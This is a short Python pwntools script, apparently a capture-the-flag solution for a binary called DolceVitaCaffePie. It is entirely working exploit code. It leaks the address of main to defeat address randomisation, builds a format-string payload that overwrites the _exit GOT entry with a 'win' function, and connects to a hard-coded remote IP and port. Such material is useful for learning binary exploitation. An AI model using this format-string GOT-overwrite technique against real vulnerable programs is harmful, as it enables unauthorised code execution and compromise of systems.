#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./DolceVitaCaffePie")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("92.246.89.201", 10002)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b"Reach out and enter? [y/n]:", b"y")
	
	r.recvuntil(b".......................")
	main_leak = int(r.recvuntil(b".", drop=True))
	success(f"{hex(main_leak)=}")
	exe.address = main_leak - exe.symbols['main']
	success(f"{hex(exe.address)=}")

	r.sendlineafter(b"Ask for a cappuccino? [y/n]:", "y")
	r.sendlineafter(b"Do you answer the barista? [y/n]:", "y")

	offset = 10
	writes = { exe.got['_exit']: exe.symbols['win'] }
	payload = fmtstr_payload(offset, writes, write_size='short')
	r.sendlineafter(b"> ", payload)

	r.interactive()


if __name__ == "__main__":
	main()
